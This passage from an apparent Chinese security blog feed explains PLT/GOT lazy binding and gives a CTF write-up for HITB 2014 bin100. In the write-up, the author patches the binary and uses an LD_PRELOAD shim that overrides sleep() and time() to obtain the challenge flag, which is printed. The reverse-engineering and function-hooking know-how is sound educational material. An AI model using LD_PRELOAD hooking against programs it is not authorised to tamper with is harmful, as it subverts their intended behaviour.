系统调用的实现。</p><p><strong>请谅解英语不是我的母语，对于任何不恰当的表述我深感抱歉。如果你发现任何错误，请在 <a href="https://github.com/0xAX/linux-internals" target="_blank" rel="external">linux-insides</a> 给我发 PR  。</strong></p><h2><span id="参考链接">参考链接</span></h2><ul><li><a href="https://en.wikipedia.org/wiki/System_call" target="_blank" rel="external">system call</a></li><li><a href="http://man7.org/linux/man-pages/man2/open.2.html" target="_blank" rel="external">open</a></li><li><a href="https://en.wikipedia.org/wiki/File_descriptor" target="_blank" rel="external">file descriptor</a></li><li><a href="https://en.wikipedia.org/wiki/Procfs" target="_blank" rel="external">proc</a></li><li><a href="https://www.gnu.org/software/libc/manual/html_mono/libc.html#File-Position-Primitive" target="_blank" rel="external">GNU C Library Reference Manual</a></li><li><a href="https://en.wikipedia.org/wiki/IA-64" target="_blank" rel="external">IA-64</a> </li><li><a href="https://en.wikipedia.org/wiki/X86-64" target="_blank" rel="external">x86_64</a></li><li><a href="http://man7.org/linux/man-pages/man3/opendir.3.html" target="_blank" rel="external">opendir</a></li><li><a href="http://man7.org/linux/man-pages/man7/fanotify.7.html" target="_blank" rel="external">fanotify</a></li><li><a href="https://en.wikipedia.org/wiki/Fork_\(system_call\" target="_blank" rel="external">fork</a>)</li><li><a href="https://en.wikipedia.org/wiki/Exec_\(system_call\" target="_blank" rel="external">execve</a>)</li><li><a href="https://en.wikipedia.org/wiki/Symbolic_link" target="_blank" rel="external">symlink</a></li><li><a href="https://linux.die.net/man/8/auditd" target="_blank" rel="external">audit</a></li><li><a href="https://en.wikipedia.org/wiki/Inode" target="_blank" rel="external">inode</a></li><li><a href="https://www.kernel.org/doc/Documentation/RCU/whatisRCU.txt" target="_blank" rel="external">RCU</a></li><li><a href="http://man7.org/linux/man-pages/man2/read.2.html" target="_blank" rel="external">read</a></li><li><a href="https://0xax.gitbooks.io/linux-insides/content/SysCall/syscall-4.html" target="_blank" rel="external">previous part</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;最近参与了一个开源项目，Linux 内核揭秘：&lt;a href=&quot;https://github.com/MintCN/linux-insides-zh&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://github.com/MintCN/linu
      
    
    </summary>
    
      <category term="Linux" scheme="https://asanzjx.github.io/categories/Linux/"/>
    
    
      <category term="Linux" scheme="https://asanzjx.github.io/tags/Linux/"/>
    
      <category term="Translation" scheme="https://asanzjx.github.io/tags/Translation/"/>
    
  </entry>
  
  <entry>
    <title>.plt/.got.plt及延迟绑定重定位技术详解</title>
    <link href="https://asanzjx.github.io/2018/07/24/pltgot/"/>
    <id>https://asanzjx.github.io/2018/07/24/pltgot/</id>
    <published>2018-07-24T07:30:00.000Z</published>
    <updated>2018-07-24T09:17:31.422Z</updated>
    
    <content type="html"><![CDATA[<p>之前做的一个验证实验，直观了解下延迟绑定重定位技术。</p><h1><span id="pltgotplt">.plt/.got.plt</span></h1><p>.plt存储的是过程连接表 (Procedure Linkege Table,PLT) 。包含了共享库函数地址解析的代码。每个 PLT entry 对应一个function的解析。</p><p>.got.plt存储着全局偏移表。每个 entry 存储着一个函数的实际地址，其中前3个 entry 是特殊的。</p><ul><li>GOT[0]:存放了指向可执行文件动态段的地址</li><li>GOT[1]:存放link_map结构的地址</li><li>GOT[2]:存放了指向动态链接器_dl_runtime_resolve()函数的地址</li></ul><h1><span id="示例分析">示例分析</span></h1><p>.plt和.got.plt共同构成了共享库重定位延迟绑定技术，实现了对共享库的动态解析。这里以调用write()函数为例<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">write(STDOUT_FILENO,&quot;Hello,World\n&quot;,13);</span><br><span class="line">write(STDOUT_FILENO,&quot;Second run\n&quot;,12);</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">#compiler</span><br><span class="line">gcc -z norelro -no-pie -fno-stack-protector -g -o test_plt_got test_plt_got.c</span><br></pre></td></tr></table></figure></p><p>这个程序会连续两次调用write()函数。</p><h2><span id="查看-plt">查看 .plt</span></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$objdump -d -j .plt ./test_plt_got</span><br><span class="line"></span><br><span class="line">Disassembly of section .plt:</span><br><span class="line"></span><br><span class="line">080482d0 &lt;.plt&gt;:</span><br><span class="line">80482d0:       ff 35 a8 97 04 08       pushl  0x80497a8</span><br><span class="line">80482d6:       ff 25 ac 97 04 08       jmp    *0x80497ac</span><br><span class="line">80482dc:       00 00                   add    %al,(%eax)</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">08048300 &lt;write@plt&gt;:</span><br><span class="line">8048300:       ff 25 b8 97 04 08       jmp    *0x80497b8</span><br><span class="line">8048306:       68 10 00 00 00          push   $0x10</span><br><span class="line">804830b:       e9 c0 ff ff ff          jmp    80482d0 &lt;.plt&gt;</span><br></pre></td></tr></table></figure><h2><span id="查看-gotplt">查看 .got.plt</span></h2><p>*0x80497b8存储的就是write()的.got.plt entry 地址。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$objdump -R ./test_plt_got</span><br><span class="line"></span><br><span class="line">./test_plt_got:     file format elf32-i386</span><br><span class="line"></span><br><span class="line">DYNAMIC RELOCATION RECORDS</span><br><span class="line">OFFSET   TYPE              VALUE</span><br><span class="line">080497a0 R_386_GLOB_DAT    __gmon_start__</span><br><span class="line">080497b0 R_386_JUMP_SLOT   read@GLIBC_2.0</span><br><span class="line">080497b4 R_386_JUMP_SLOT   __libc_start_main@GLIBC_2.0</span><br><span class="line">080497b8 R_386_JUMP_SLOT   write@GLIBC_2.0</span><br></pre></td></tr></table></figure></p><h1><span id="运行过程解析">运行过程解析</span></h1><p>peda-gdb 调试，b write@plt 下断点，r运行，解析过程如下：</p><h3><span id="1程序运行第一次调用write函数调用writeplt-reffigplt1_png">1.程序运行，第一次调用write()函数，调用write@plt() \ref{fig:plt1_PNG}</span></h3><p><img src="/images/pltgot/plt1.PNG" alt="调用write@plt"></p><h3><span id="2plt-代码做一次到-got-中地址的间接跳转jmp-0x80497b8-即-writegot-地址为0x80497b8">2.PLT 代码做一次到 GOT 中地址的间接跳转：jmp *0x80497b8 , 即 write@got 地址为0x80497b8</span></h3><p>x 0x80497b8,可以发现存储的数据为0x8048306,也就是write@plt的第二行指令<br><img src="/images/pltgot/plt2.PNG" alt="0x80497b8存储的数据"></p><h3><span id="3这样就又回到了-plt-代码执行push-0x10">3.这样就又回到了 PLT 代码，执行push 0x10</span></h3><h3><span id="4执行-plt-第三行代码jmp-0x80482d0跳转到-plt0">4.执行 PLT 第三行代码：jmp 0x80482d0，跳转到 PLT[0]</span></h3><p>查看 PLT[0] 前两行涉及到的指针，查看其存储的数据分别为：0xb7fff920;0xb7fee2f0<br><img src="/images/pltgot/plt3.PNG" alt="PLT[0]"></p><h3><span id="5plt0-第一行指令-push-got1-的地址该地址中存放了指向link_map的偏移地址">5.PLT[0] 第一行指令 push GOT[1] 的地址，该地址中存放了指向link_map的偏移地址</span></h3><h3><span id="6plt0-第二行指令跳转到-got2-存放的地址该地址指向了动态链接器的-_dl_runtime_resolve-函数">6.PLT[0] 第二行指令跳转到 GOT[2] 存放的地址，该地址指向了动态链接器的 _dl_runtime_resolve() 函数</span></h3><p>_dl_runtime_resolve() 会将write()函数真正的内存地址加到 GOT entry 中<br><img src="/images/pltgot/plt4.PNG" alt="重定位write()"></p><h3><span id="7第二次调用write函数时可以发现-writeplt-将直接跳转到-glibc-中的-write-函数地址0xb7ead760">7.第二次调用write()函数时，可以发现 write@plt 将直接跳转到 glibc 中的 write() 函数地址0xb7ead760</span></h3><p><img src="/images/pltgot/plt5.PNG" alt="重定位write()"></p><h1><span id="参考">参考</span></h1><ul><li>Learning Linux Binary Analysis.Ryan O’Neill</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;之前做的一个验证实验，直观了解下延迟绑定重定位技术。&lt;/p&gt;
&lt;h1&gt;&lt;span id=&quot;pltgotplt&quot;&gt;.plt/.got.plt&lt;/span&gt;&lt;/h1&gt;&lt;p&gt;.plt存储的是过程连接表 (Procedure Linkege Table,PLT) 。包含了共享库函数
      
    
    </summary>
    
      <category term="Compiler" scheme="https://asanzjx.github.io/categories/Compiler/"/>
    
    
      <category term="Linux" scheme="https://asanzjx.github.io/tags/Linux/"/>
    
      <category term="Compiler" scheme="https://asanzjx.github.io/tags/Compiler/"/>
    
  </entry>
  
  <entry>
    <title>详解2014hitb_bin100.elf，LD_PRELOAD注入so</title>
    <link href="https://asanzjx.github.io/2018/07/21/ldpreload-2014hitb_bin100/"/>
    <id>https://asanzjx.github.io/2018/07/21/ldpreload-2014hitb_bin100/</id>
    <published>2018-07-21T10:30:00.000Z</published>
    <updated>2018-07-21T10:46:43.951Z</updated>
    
    <content type="html"><![CDATA[<p>本来是想了解下 LD_PRELOAD 注入 so 的。断断续续磕了几天，静下心来总算把程序给摸清了，有一种豁然释怀的感觉，满足。</p><h1><span id="1前期侦测">1.前期侦测</span></h1><p>hitb_bin100.elf: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=99a4be07e428a159472b8e4b3508476feab70e8b, not stripped</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Canary                        : Yes</span><br><span class="line">NX                            : Yes</span><br><span class="line">PIE                           : No</span><br><span class="line">Fortify                       : Yes</span><br><span class="line">RelRO                         : Partial</span><br></pre></td></tr></table></figure><p>运行发现，程序一直在输出一些逆序的字符串，查了下发现是 YTCrack 的 LulzSec Anthem Song, 当时去云音乐查，还没有，果断 @云村曲库君啊，一个小时后就补上了，还是蛮惊喜的，生活小乐趣吧，哈哈。</p><h1><span id="2ida-分析及探索尝试">2.IDA 分析及探索尝试</span></h1><p>从 main 函数入手，汇编代码大致流程如下：</p><ol><li>store_time_ret:0x4007d8</li><li>rand_call_funny:0x400719</li><li>print_funny_sleep:0x400783</li></ol><p>接下来我直接 patch 了程序，直接 call print_flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">KEY: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">OK YOU WIN. HERE&apos;S YOUR FLAG: iYSg.&apos;J%+i,7&quot;rmn~uJ    -</span><br></pre></td></tr></table></figure></p><p>发现是需要 key 的，进一步分析在 print_funny_sleep 中 printf 和 sleep 影响了key的输出结果，patch 了这个函数，改为 nop<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">KEY: 1b 1b 24 f0 d9 d9 d9 d9 d9 25 25 25 04 b6 33 33 33 33 c5 fd 89 89 78 78 5a 88 88 ee ee eb 40 40 40 40 f6 0e</span><br><span class="line">OK YOU WIN. HERE&apos;S YOUR FLAG: r6OEBZiѾ</span><br><span class="line"> 4f1㌍#</span><br></pre></td></tr></table></figure></p><p>显然结果是不对的。patch printf 应该是没问题的，应该 sleep 出现了问题</p><h1><span id="3具体分析">3.具体分析</span></h1><p>结合国内的 writeup , patch 了 printf funny，然后 IDA F5，分析 C 流程<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">qmemcpy(v22, &amp;unk_400A7E, sizeof(v22));// read uinit flag</span><br><span class="line">v24 = __readfsqword(0x28u);</span><br><span class="line">v3 = v21;</span><br><span class="line">for ( i = 9LL; i; --i )&#123;</span><br><span class="line">    *(_DWORD *)v3 = 0;</span><br><span class="line">    v3 += 4;</span><br><span class="line">&#125; // init v21，v21 key_buf</span><br><span class="line">v19 = 201527; // 0x31337</span><br><span class="line">v20 = time(0LL);</span><br><span class="line">do&#123;</span><br><span class="line">    v11 = 0LL;</span><br><span class="line">    do&#123;</span><br><span class="line">        v5 = 0LL;</span><br><span class="line">        v6 = time(0LL);</span><br><span class="line">        srand(233811181 - v20 + v6); // init randmon seed</span><br><span class="line">        v7 = v21[v11];</span><br><span class="line">        v21[v11] = rand() ^ v7; // key_buf element xor</span><br><span class="line">        v8 = (&amp;funny)[v11];</span><br><span class="line">        while ( v5 &lt; strlen(v8) )&#123;</span><br><span class="line">            v9 = v8[v5];</span><br><span class="line">            if ( (_BYTE)v9 == 105 )&#123;</span><br><span class="line">                v23[(signed int)v5] = 105;</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">            if ( (_DWORD)v5 &amp;&amp; v8[v5 - 1] != 32 )</span><br><span class="line">                v10 = __ctype_toupper_loc();</span><br><span class="line">            else</span><br><span class="line">                v10 = __ctype_tolower_loc();</span><br><span class="line">            v23[(signed int)v5] = (*v10)[v9];</span><br><span class="line">        &#125;</span><br><span class="line">        ++v5;</span><br><span class="line">        &#125;</span><br><span class="line">        v23[(signed int)v5] = 0;</span><br><span class="line">        ++v11;                                    // </span><br><span class="line">        // here is print funny,emm...but i patch it</span><br><span class="line">        sleep(1u);</span><br><span class="line">    &#125;while ( v11 != 36 );</span><br><span class="line">    --v19;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2><span id="31-程序流程详解">3.1 程序流程详解</span></h2><p>仔细分析程序流程，大致就是计算 key( 随机值与 0 xor 201527次)，然后 key 与 一段固定的值( uinit_flag ) xor 得到flag,输出flag，重点在计算 key 的三个嵌套循环中</p><ol><li>复制未初始化的 flag</li><li>栈保护 (Canary)</li><li>key_buf 清0</li><li>初始化大循环条件，v19 == 201527</li><li>大循环，循环条件，v19 &gt;= 0，也就是要循环201527次<ol><li>初始化中循环条件变量，v11 = 0</li><li>中循环，循环条件，v11 !=36,36 即 flag 的长度，也是 key 的长度<ol><li>通过时间差获取随机数种子</li><li>随机数 与 key_buf 数组中下标为 v11 的元素异或</li><li>小循环：格式化一行 funny</li></ol></li><li>输出一行 funny</li><li>sleep(1)</li></ol></li><li>输出 key</li><li>key xor uint_flag,输出flag</li></ol><p>算下来，整个大循环需要 201527 次，sleep(1)， 201527/60/60，也就是说至少要 55 个小时才能跑完这三个嵌套循环。</p><h2><span id="32-srandrand-机制">3.2 srand()/rand() 机制</span></h2><p>这里需要理解 srand()/rand() ，其要点就是随机数种子一致，生成的随机数是一致的。可通过以下代码验证：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line">* file: rand_srand.cpp</span><br><span class="line">* author: asanzjx</span><br><span class="line">* rand srand test file</span><br><span class="line">* compiler: g++ rand_srand.cpp -o rand_srand</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include &lt;time.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line">static int t = 0x31337;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">    int i = 0;</span><br><span class="line">    for(i;i&lt;10;i++)&#123;</span><br><span class="line">        srand(time(0));</span><br><span class="line">        sleep(1);</span><br><span class="line">        cout &lt;&lt; i &lt;&lt; &quot; random value:&quot; &lt;&lt; rand() &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // if the srand ret some value,the random value is some </span><br><span class="line">    for(i;i&gt;0;i--)&#123;</span><br><span class="line">        srand(t);</span><br><span class="line">        sleep(1);</span><br><span class="line">        cout &lt;&lt; i &lt;&lt; &quot; random value:&quot; &lt;&lt; rand() &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$./rand_srand</span><br><span class="line">0 random value:1498851891</span><br><span class="line">1 random value:125926385</span><br><span class="line">2 random value:1958051108</span><br><span class="line">3 random value:1663308015</span><br><span class="line">4 random value:1351789803</span><br><span class="line">5 random value:2121833688</span><br><span class="line">6 random value:753716439</span><br><span class="line">7 random value:1513028956</span><br><span class="line">8 random value:136593720</span><br><span class="line">9 random value:907047410</span><br><span class="line">10 random value:1427067673</span><br><span class="line">9 random value:1427067673</span><br><span class="line">8 random value:1427067673</span><br><span class="line">7 random value:1427067673</span><br><span class="line">6 random value:1427067673</span><br><span class="line">5 random value:1427067673</span><br><span class="line">4 random value:1427067673</span><br><span class="line">3 random value:1427067673</span><br><span class="line">2 random value:1427067673</span><br><span class="line">1 random value:1427067673</span><br></pre></td></tr></table></figure></p><p><strong>所以通过连续的时间差来确保程序每次运行时种子值序列是一致的，从而使程序每次运行的随机值序列一致，这样程序每次运行的 key 值是一致的，自然程序每次输出的 flag 值一致。</strong></p><h1><span id="4通过-ld_preload-注入-so-来加速时间">4.通过 LD_PRELOAD 注入 so 来加速时间</span></h1><p>如果按照正常执行这个程序，需要55个小时，这显然是不能忍的，所以要加快速度。方法就是改写 sleep()<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line">* file: anti_time.c</span><br><span class="line">* compiler: gcc --share anti_time.c -o anti_time.so</span><br><span class="line">* LD_PRELOAD=./anti_time.so ./hitb_bin100.elf</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">static int t = 0x31337;</span><br><span class="line"></span><br><span class="line">void sleep(int sec) &#123;</span><br><span class="line">t += sec;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int time() &#123;</span><br><span class="line">return t;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>sleep() 不执行 sleep() 操作这个好理解，但为什么要返回 t+sec 以及 time() 函数返回 t 呢？这当然是和 key 的 xor 操作有关，保证时间差值序列一致。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$LD_PRELOAD=./anti_time.so ./hitb_bin100.elf</span><br><span class="line">KEY: 19 8f 67 74 c9 68 e6 0c 6f 54 1a 43 af 7b 5f b3 5c 01 98 58 68 56 1a 5e 31 0c 46 29 b8 a8 93 fc bf f9 70 5e</span><br><span class="line">OK YOU WIN. HERE&apos;S YOUR FLAG: p4ul_1z_d34d_1z_wh4t_th3_r3c0rd_s4ys</span><br></pre></td></tr></table></figure></p><h1><span id="5ld_preload-示例">5.LD_PRELOAD 示例</span></h1><p>LD_PRELOAD 是一种动态注入，在程序运行时加载。通过代码实际感受下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line">* file: preload.c</span><br><span class="line">* author: asanzjx</span><br><span class="line">* compiler: gcc preload.c -o preload</span><br><span class="line">* LD_PRELOAD=./anti_time.so ./preload</span><br><span class="line">*/</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;time.h&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">printf(&quot;[+]pid:%d&quot;,getpid());</span><br><span class="line">while(1)&#123;</span><br><span class="line">sleep(2);</span><br><span class="line">printf(&quot;[+]time:0x%x&quot;,time(0));</span><br><span class="line">&#125;   </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line">* file: anti_time.c</span><br><span class="line">* author: asanzjx</span><br><span class="line">* compiler: gcc --share anti_time.c -o anti_time.so</span><br><span class="line">* LD_PRELOAD=./anti_time.so ./preload</span><br><span class="line">*/</span><br><span class="line">int time() &#123;</span><br><span class="line">return t;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>查看maps结果如下（部分省略）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$LD_PRELOAD=./anti_time.so ./preload</span><br><span class="line">[+]pid:124</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">$cat /proc/124/maps</span><br><span class="line">7fa715450000-7fa7155e5000 r-xp 00000000 00:00 689225             /lib/x86_64-linux-gnu/libc-2.x.so</span><br><span class="line">7fa7155e5000-7fa7155ed000 ---p 00195000 00:00 689225             /lib/x86_64-linux-gnu/libc-2.x.so</span><br><span class="line"></span><br><span class="line">7fa7157f0000-7fa7157f1000 r-xp 00000000 00:00 714489             .../anti_time.so</span><br><span class="line">7fa7157f1000-7fa7157f2000 ---p 00001000 00:00 714489             .../anti_time.so</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p><p>ldd 加载库如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ldd ./preload</span><br><span class="line">linux-vdso.so.1 (0x00007fffdf1d3000)</span><br><span class="line">libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f4442830000)</span><br><span class="line">/lib64/ld-linux-x86-64.so.2 (0x00007f4442e00000)</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;本来是想了解下 LD_PRELOAD 注入 so 的。断断续续磕了几天，静下心来总算把程序给摸清了，有一种豁然释怀的感觉，满足。&lt;/p&gt;
&lt;h1&gt;&lt;span id=&quot;1前期侦测&quot;&gt;1.前期侦测&lt;/span&gt;&lt;/h1&gt;&lt;p&gt;hitb_bin100.elf: ELF 64-bi
      
    
    </summary>
    
      <category term="CTF,Linux," scheme="https://asanzjx.github.io/categories/CTF-Linux/"/>
    
    
      <category term="Linux" scheme="https://asanzjx.github.io/tags/Linux/"/>
    
      <category term="CTF" scheme="https://asanzjx.github.io/tags/CTF/"/>
    
      <category term="LD_PRELOAD" scheme="https://asanzjx.github.io/tags/LD-PRELOAD/"/>
    
  </entry>
  
  <entry>
    <title>三种分页模式(32bit,PAE,IA-32e)下的线性（虚拟）地址到物理地址的转换</title>
    <link href="https://asanzjx.github.io/2018/05/06/3PagingModeVtoP/"/>
    <id>https://asanzjx.github.io/2018/05/06/3PagingModeVtoP/</id>
    <published>2018-05-06T08:30:00.000Z</published>
    <updated>2018-05-06T14:41:01.537Z</updated>
    
    <content type="html"><![CDATA[<p>为了更好管理更大的内存，现代操作系统和CPU硬件引入了保护模式。其中保护模式的分页机制通过内存管理单元（MMU，Memory Management Unit）实现了物理地址到线性（虚拟）地址的转换，这个转换过程也称地址翻译。而本文探讨线性地址到物理地址的转换过程，并通过实际操作来体现。</p><p>实验环境：</p><ul><li>win 10</li><li>windbg Preview</li><li>VirtBox+win xp(切换PAE状态)</li></ul><p>实验环境主要涉及Windbg通过VirtBox实现内核双机调试和本地内核调试。</p><p>具体理论部分可参考Intel手册中关于<strong>Paging</strong>的章节：<a href="https://www.intel.com/content/www/us/en/architecture-and-technology/64-ia-32-architectures-software-developer-manual-325462.html" target="_blank" rel="external">https://www.intel.com/content/www/us/en/architecture-and-technology/64-ia-32-architectures-software-developer-manual-325462.html</a></p><h1><span id="涉及到的概念">涉及到的概念</span></h1><p>控制寄存器：</p><ul><li>cr0：分页机制的开关，PE位代表保护模式。PG位代表分页机制</li><li>cr3：分页数据结构的基地址，cr3中存储的物理地址与分页模式有关</li><li>cr4：控制硬件虚拟化设置(Pentium及80486以后才有)</li></ul><p><strong>PAE</strong>:Physical Address Extension,物理地址扩展。</p><p>查看系统是否开启了PAE（以xp为例），我的电脑-系统属性-常规：计算机;或者查看CR4寄存器的5位是否为1。</p><p>对于在长模式(long mode)中的x64来说，PAE是必须的。PAE改变了传统的保护模式分页机制，增加了一级页,CR3不再指向页目录物理段地址，而是指向页目录指针表，即一个包含4个页目录指针的表。</p><h1><span id="分页模式">分页模式</span></h1><p>启用分页模式条件：cr0.PG = 1 且 cr0.PE = 1</p><p>根据不同CPU架构及特性主要分为三种模式，处于哪种模式视寄存器属性不同：</p><ul><li>32-bit paging(32位OS): cr0.PG = 1 ; cr4.PAE = 0</li><li>PAE paging(32位OS且开启了PAE): cr0.PG = 1 ; cr4.PAE = 1 ; IA32_EFER.LME = 0</li><li>IA-32e paging(64位OS): cr0.PG = 1 ; cr4.PAE = 1 ; IA32_EFER.LME = 1</li></ul><p><strong>需要注意的是</strong>：</p><ol><li>32bit下，每个entry（表项）是4字节大小；而在PAE和IA-32e下，每个entry是8字节大小</li><li>在x64体系中只实现了48位的virtual address，高16位被用作符号扩展，这高16位要么全是0，要么全是1。所以在讨论64bit地址的时候，高16位不使用<h2><span id="paging相关数据结构">Paging相关数据结构</span></h2></li></ol><ul><li><strong>PML4T</strong>:The page map level 4 table,每个表为4kb,内含512个PML4E结构。这个表的物理基址存储在cr3[12:51]中(IA-32e特有)</li><li><strong>PML4E</strong>:The page map level 4 entry，PML4表项，每个8字节大小(IA-32e特有)</li><li><strong>PDPT</strong>：Page Directory Pointer Table，页目录指针表，每个表4kb,内含512分PDPTE结构(PAE和IA-32e特有，PAE下这个表的物理地址存储在cr3[5:31]中)</li><li><strong>PDPTE/PDPE</strong>：Page Directory Pointer Table Entry,页目录指针表项，每个8字节(PAE和IA-32e特有)</li><li><strong>PDT</strong>：Page Directory Table，每个表4K，内含512个PDE结构</li><li><strong>PDTE/PDE</strong>:Page Directory Table Entry,页目录表的表项</li><li><strong>PT</strong>：Page Table，每个4kb，内含512个PTE结构</li><li><strong>PTE</strong>：Page Table 